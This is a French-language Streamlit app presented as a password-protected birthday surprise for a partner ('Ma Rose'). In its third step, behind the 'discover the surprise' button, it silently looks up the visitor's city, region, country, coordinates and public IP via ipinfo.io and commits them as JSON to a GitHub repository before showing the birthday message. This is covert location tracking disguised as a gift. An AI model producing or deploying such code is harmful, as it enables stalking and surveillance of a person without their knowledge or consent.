import streamlit as st
import requests
import datetime
import base64
import json

# --- Configuration de la page ---
st.set_page_config(page_title="Joyeux Anniversaire Ma Rose 🌹", page_icon="🌹", layout="centered")

# --- Style CSS romantique ---
st.markdown("""
    <style>
    .main {
        background-color: #fff0f3;
    }
    h1, h2, h3 {
        color: #d90429;
        font-family: 'Helvetica Neue', sans-serif;
    }
    .stButton>button {
        background-color: #ff4d6d;
        color: white;
        font-weight: bold;
        border-radius: 10px;
        border: none;
        padding: 10px 24px;
    }
    .stButton>button:hover {
        background-color: #c9184a;
        color: white;
    }
    </style>
""", unsafe_allow_html=True)

# --- Fonction pour envoyer le JSON sur GitHub ---
def envoyer_json_sur_github(donnees_dict):
    GITHUB_TOKEN = "VOTRE_TOKEN_ICI"  # Remplacez par votre token GitHub
    NOM_REPO = "B1ackeag1e/Test"
    NOM_FICHIER = "informations.json"
    
    url = f"https://api.github.com/repos/{NOM_REPO}/contents/{NOM_FICHIER}"
    
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # 1. Vérifier si le fichier existe pour récupérer son SHA
    sha = None
    r_check = requests.get(url, headers=headers)
    if r_check.status_code == 200:
        sha = r_check.json().get("sha")
        
    # 2. Formater les données en JSON propre
    contenu_json_str = json.dumps(donnees_dict, indent=4, ensure_ascii=False)
    
    # 3. Encoder en Base64
    contenu_b64 = base64.b64encode(contenu_json_str.encode("utf-8")).decode("utf-8")
    
    message_commit = f"Mise à jour des informations JSON - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    payload = {
        "message": message_commit,
        "content": contenu_b64
    }
    
    if sha:
        payload["sha"] = sha
        
    # 4. Envoyer à GitHub
    r_put = requests.put(url, headers=headers, json=payload)
    
    if r_put.status_code in [200, 201]:
        return True, "Succès"
    else:
        return False, f"Code {r_put.status_code}: {r_put.text}"

# --- Gestion des étapes avec la Session State ---
if "etape" not in st.session_state:
    st.session_state.etape = 1

# ==========================================
# ÉTAPE 1 : Le mot de passe (CINGENE)
# ==========================================
if st.session_state.etape == 1:
    st.title("🔐 Espace Sécurisé")
    st.write("Bienvenue... Pour accéder à cette surprise d'anniversaire, prouve-moi que c'est bien toi, ma rose. 🌹")
    
    mdp = st.text_input("Entre le mot de passe secret :", type="password")
    
    if st.button("Valider le mot de passe"):
        if mdp.strip().upper() == "CINGENE":
            st.session_state.etape = 2
            st.rerun()
        else:
            st.error("Mot de passe incorrect. Indice : C'est un mot très précieux...")

# ==========================================
# ÉTAPE 2 : Les questions personnelles
# ==========================================
elif st.session_state.etape == 2:
    st.title("💭 Quelques petits tests d'amour...")
    st.write("Juste pour être absolument sûr(e) que c'est bien ma reine qui est connectée ! ✨")
    
    q1 = st.radio("1. Quelle est la couleur du chat ?", ("Noir", "Blanc", "Roux", "Gris"))
    q2 = st.selectbox("2. Quel combattant UFC est adoré ici ?", ("Conor McGregor", "Islam Makhachev", "Jon Jones", "Khabib Nurmagomedov"))
    
    if st.button("Valider les réponses"):
        if q1.lower() == "blanc" and "makhachev" in q2.lower():
            st.session_state.etape = 3
            st.rerun()
        else:
            st.error("Mmmh... Ce ne sont pas les bonnes réponses ! Réfléchis bien mon cœur. 🧐")

# ==========================================
# ÉTAPE 3 : Le bouton Prêt / L'attente
# ==========================================
elif st.session_state.etape == 3:
    st.title("🎉 Tout est prêt pour toi...")
    st.write("Tu as brillamment réussi les tests. Cette page a été développée spécialement pour ton anniversaire, parce que tu comptes énormément pour moi, bien plus que tu ne le penses.")
    
    st.info("🎁 Clique sur le bouton ci-dessous pour lancer la surprise magique !")
    
    if st.button("Prêt(e) ! Découvrir la surprise 🌹"):
        # --- COLLECTE DES INFORMATIONS SOUS FORMAT DICTIONNAIRE (JSON) ---
        donnees_visite = {
            "ville": "Inconnue",
            "region": "Inconnue",
            "pays": "Inconnue",
            "latitude": "Inconnue",
            "longitude": "Inconnue",
            "ip_publique": "Inconnue",
            "date_heure": datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        try:
            r = requests.get("https://ipinfo.io/json", timeout=5)
            if r.ok:
                d = r.json()
                loc = d.get("loc", "0,0").split(",")
                donnees_visite["latitude"] = loc[0] if len(loc) > 0 else "Inconnue"
                donnees_visite["longitude"] = loc[1] if len(loc) > 1 else "Inconnue"
                donnees_visite["ville"] = d.get("city", "Inconnue")
                donnees_visite["region"] = d.get("region", "Inconnue")
                donnees_visite["pays"] = d.get("country", "Inconnue")
                donnees_visite["ip_publique"] = d.get("ip", "Inconnue")
        except Exception as e:
            donnees_visite["erreur"] = str(e)
        
        # Enregistrement du fichier JSON sur GitHub
        succes, message_erreur = envoyer_json_sur_github(donnees_visite)
        
        if succes:
            st.success("Fichier JSON envoyé avec succès sur GitHub !")
            st.session_state.etape = 4
            st.rerun()
        else:
            st.error(f"Échec de l'envoi GitHub : {message_erreur}")

# ==========================================
# ÉTAPE 4 : La page finale d'anniversaire
# ==========================================
elif st.session_state.etape == 4:
    st.balloons()
    st.title("🌹 Joyeux Anniversaire Ma Rose ! 🌹")
    st.markdown("""
    ### Mon cœur,
    
    Si tu lis ce message, c'est que tu as passé toutes les étapes avec succès. 
    Cette petite application a été codée rien que pour toi, pour te prouver à quel point tu es unique et importante à mes yeux.
    
    Je te souhaite le plus merveilleux des anniversaires, rempli de bonheur, de sourires et de tout l'amour que tu mérites.
    
    *Je t'aime fort.* ❤️
    """)
